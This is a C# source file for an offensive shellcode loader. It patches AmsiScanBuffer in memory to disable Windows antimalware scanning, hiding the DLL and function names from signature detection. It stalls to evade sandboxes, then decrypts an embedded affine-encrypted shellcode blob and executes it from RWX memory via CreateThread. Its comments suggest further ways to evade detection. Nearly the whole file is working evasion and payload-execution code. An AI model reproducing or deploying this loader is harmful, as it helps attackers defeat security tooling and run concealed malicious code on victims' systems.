using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;



// In a real-world situation I'd remove all the comments & whitespace to have as small of a payload as possible


class AffineCipher
{

    [DllImport("kernel32.dll", SetLastError = false)] // Disable setlasterror to false to reduce noise
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = false, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma( // Can we find a BETTER non-emulated api here 
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect,
        uint nndPreferred
    );

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread( // Can we find a non-emulated api here as well? 
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId
    );

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject( // Can we find a non-emulated api here as well? 
        IntPtr hHandle,
        uint dwMilliseconds
    );

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);


public static void Patch()
{
    // Obfuscate strings to avoid static AV signature detection
    string dll = string.Concat("a", "m", "s", "i", ".", "d", "l", "l");
    string func = string.Concat("A", "m", "s", "i", "S", "c", "a", "n", "B", "u", "f", "f", "e", "r");

    IntPtr hModule = LoadLibrary(dll);
    IntPtr procAddress = GetProcAddress(hModule, func);

    uint oldProtect;
    VirtualProtect(procAddress, (UIntPtr)6, 0x40, out oldProtect); // PAGE_EXECUTE_READWRITE

    // Patch bytes: mov eax,0x80070057; ret
    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    Marshal.Copy(patch, 0, procAddress, patch.Length);

    VirtualProtect(procAddress, (UIntPtr)6, oldProtect, out _);
}


    static void Main()
    {
        Console.WriteLine("[*] Affine loader starting…");
        
        
        Patch();    
        Console.WriteLine("[*] AMSI patched");
        
        var sw = Stopwatch.StartNew();
        


        while (sw.ElapsedMilliseconds < 10000) {} // Sleep to try to evade sandbox detection
        
        byte[] encrypted = new byte[] { 0x41, 0x2d, 0xd0, 0xe9, 0x95, 0xcd, 0xad, 0x25, 0x25, 0x25, 0x1e, 0xae, 0x1e, 0xf5, 0x67, 0xae, 0x4b, 0x2d, 0x8e, 0xe7, 0x22, 0x2d, 0x98, 0x67, 0x85, 0x2d, 0x98, 0x67, 0x7d, 0x2d, 0x98, 0x67, 0x45, 0x2d, 0x98, 0x87, 0xf5, 0x2d, 0xfc, 0x64, 0x9f, 0x9f, 0xca, 0x8e, 0x66, 0x2d, 0x8e, 0xe5, 0x71, 0x81, 0x3e, 0xc1, 0x97, 0xf1, 0x45, 0x1e, 0x9e, 0x66, 0x8a, 0x1e, 0xde, 0x9e, 0x77, 0x6a, 0x67, 0x1e, 0xae, 0x2d, 0x98, 0x67, 0x45, 0x98, 0xd7, 0x81, 0x2d, 0xde, 0x75, 0xdb, 0x5e, 0xdd, 0x7d, 0x18, 0x97, 0xb2, 0x87, 0x98, 0xa5, 0x6d, 0x25, 0x25, 0x25, 0x2d, 0x42, 0xe5, 0xf9, 0x94, 0x2d, 0xde, 0x75, 0xf5, 0x98, 0x2d, 0x7d, 0x49, 0x98, 0x65, 0x45, 0xe6, 0xde, 0x75, 0x30, 0x4b, 0x2d, 0x6c, 0x66, 0x1e, 0x98, 0xb9, 0x6d, 0x2d, 0xde, 0xcb, 0xca, 0x8e, 0x66, 0x2d, 0x8e, 0xe5, 0x71, 0x1e, 0x9e, 0x66, 0x8a, 0x1e, 0xde, 0x9e, 0x9d, 0x05, 0xb2, 0x4e, 0x11, 0x50, 0x11, 0x29, 0xed, 0x02, 0x56, 0x2e, 0xb2, 0x3d, 0xbd, 0x49, 0x98, 0x65, 0x29, 0xe6, 0xde, 0x75, 0xdb, 0x1e, 0x98, 0xd1, 0x2d, 0x49, 0x98, 0x65, 0x61, 0xe6, 0xde, 0x75, 0x1e, 0x98, 0x09, 0x6d, 0x2d, 0xde, 0x75, 0x1e, 0xbd, 0x1e, 0xbd, 0x13, 0x76, 0x2f, 0x1e, 0xbd, 0x1e, 0x76, 0x1e, 0x2f, 0x2d, 0xd0, 0xb1, 0x45, 0x1e, 0x67, 0x6c, 0x05, 0xbd, 0x1e, 0x76, 0x2f, 0x2d, 0x98, 0x27, 0x86, 0x3c, 0x6c, 0x6c, 0x6c, 0x5a, 0xbf, 0x25, 0xe6, 0x73, 0x24, 0x06, 0xa3, 0x06, 0xa3, 0x22, 0xf9, 0x25, 0x1e, 0x4b, 0xe6, 0x26, 0x5b, 0x11, 0x26, 0x4e, 0x1e, 0x8f, 0x11, 0x24, 0x9b, 0x34, 0x6c, 0x12, 0xbf, 0x25, 0xbf, 0x25, 0x2d, 0x26, 0xbe, 0x2d, 0x8e, 0xe7, 0xca, 0x8e, 0xe5, 0xca, 0x8e, 0x66, 0x1e, 0xf5, 0x1e, 0xf5, 0x1e, 0x8f, 0x0f, 0x4b, 0x96, 0xd4, 0x6c, 0x12, 0x86, 0x5e, 0x25, 0x25, 0x25, 0x2f, 0x2d, 0x26, 0x9e, 0x1e, 0x1d, 0xa1, 0x6e, 0x25, 0x25, 0xca, 0x8e, 0x66, 0x1e, 0xae, 0x1e, 0xae, 0xbf, 0x50, 0x1e, 0xae, 0x1e, 0x8f, 0x04, 0x26, 0x0c, 0x3b, 0x6c, 0x12, 0xf8, 0x69, 0x2d, 0x26, 0x9e, 0x2d, 0x8e, 0xe7, 0x1e, 0xbd, 0xca, 0x8e, 0x66, 0x67, 0x4d, 0x25, 0x47, 0xc5, 0x89, 0x67, 0x67, 0x1e, 0x8f, 0xf8, 0x92, 0x63, 0xc8, 0x6c, 0x12, 0x2d, 0x26, 0x3b, 0xbf, 0x5f, 0xcc, 0x2d, 0x26, 0x4e, 0x8f, 0x8c, 0x25, 0x25, 0x25, 0xbf, 0x25, 0x4d, 0xa5, 0x00, 0x25, 0x25, 0xe6, 0x26, 0x05, 0x1e, 0xd6, 0x09, 0x25, 0x25, 0x25, 0x1e, 0x8f, 0xb2, 0xbb, 0x53, 0xfb, 0x6c, 0x12, 0x2d, 0x26, 0x4e, 0x2d, 0x8e, 0xe7, 0xca, 0x8e, 0xe5, 0xca, 0x8e, 0x66, 0x67, 0x67, 0x1e, 0x8f, 0xaa, 0x7b, 0x7d, 0x08, 0x6c, 0x12, 0x42, 0xe5, 0xb2, 0x1a, 0x2d, 0x6c, 0xbc, 0xf9, 0xb5, 0xf8, 0x2c, 0xf8, 0x22, 0xcd, 0x44, 0x6c, 0x6c, 0x6c, 0x1c, 0x8e, 0x47, 0x00, 0xb9, 0x72, 0x25, 0x1e, 0x73, 0x95, 0xf2, 0x37, 0x4b, 0x6c, 0x12, 0x2d, 0x8e, 0x66, 0x8f, 0x25, 0x25, 0x65, 0x25, 0x1e, 0x1d, 0x25, 0xb5, 0x25, 0x25, 0x1e, 0xd6, 0x65, 0x25, 0x25, 0x25, 0x1e, 0x8f, 0xbd, 0xa9, 0x20, 0xa2, 0x6c, 0x12, 0x2d, 0x60, 0x20, 0x20, 0x2d, 0x26, 0x14, 0x2d, 0x26, 0x4e, 0x2d, 0x26, 0xaf, 0x1e, 0x1d, 0x25, 0x45, 0x25, 0x25, 0xe6, 0x26, 0x16, 0x1e, 0x8f, 0x27, 0x8b, 0x26, 0x77, 0x6c, 0x12, 0x2d, 0xd0, 0xc9, 0x45, 0x42, 0xe5, 0xf9, 0xab, 0xdb, 0x94, 0x98, 0x34, 0x2d, 0xde, 0x10, 0x2d, 0x42, 0xe5, 0xb2, 0x12, 0xbd, 0xbd, 0x10, 0xcd, 0xe0, 0x6c, 0x6c, 0x6c };

        
        // Affine keys ( Could base64 obfuscate, obfustace with math, etc... )
        int a_inv = 137;
        int b = 37;

        // Decrypting in memory
        var type = typeof(ObfuscationUtils);
        var method = type.GetMethod("Decrypt");
        byte[] buf = (byte[])method.Invoke(null, new object[] { encrypted, a_inv, b });

        Console.WriteLine($"[*] Decrypted {buf.Length} bytes; first few bytes: {buf[0]:X2} {buf[1]:X2}");

        int size = buf.Length;


        // Allocate memory using VirtualAllocExNuma
        IntPtr procHandle = GetCurrentProcess();
        IntPtr addr = VirtualAllocExNuma(procHandle, IntPtr.Zero, (uint)size, 0x3000, 0x40, 0);
        Console.WriteLine($"[*] RWX memory allocated at 0x{addr.ToInt64():X}");


        Marshal.Copy(buf, 0, addr, size);
        Console.WriteLine("[*] Shellcode copied");

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        Console.WriteLine($"[*] CreateThread returned 0x{hThread.ToInt64():X}");
        Console.WriteLine("[*] Waiting on thread…");
        WaitForSingleObject(hThread, 0xFFFFFFFF);
        Console.WriteLine("[*] Done (should never reach here)");
    }
}

public static class ObfuscationUtils
{
    public static byte[] Decrypt(byte[] input, int a_inv, int b)
    {
        byte[] result = new byte[input.Length];
        for (int i = 0; i < input.Length; i++)
        {
            int temp = a_inv * (input[i] - b);
            result[i] = (byte)((temp + 256 * 3) % 256);
        }
        return result;
    }
}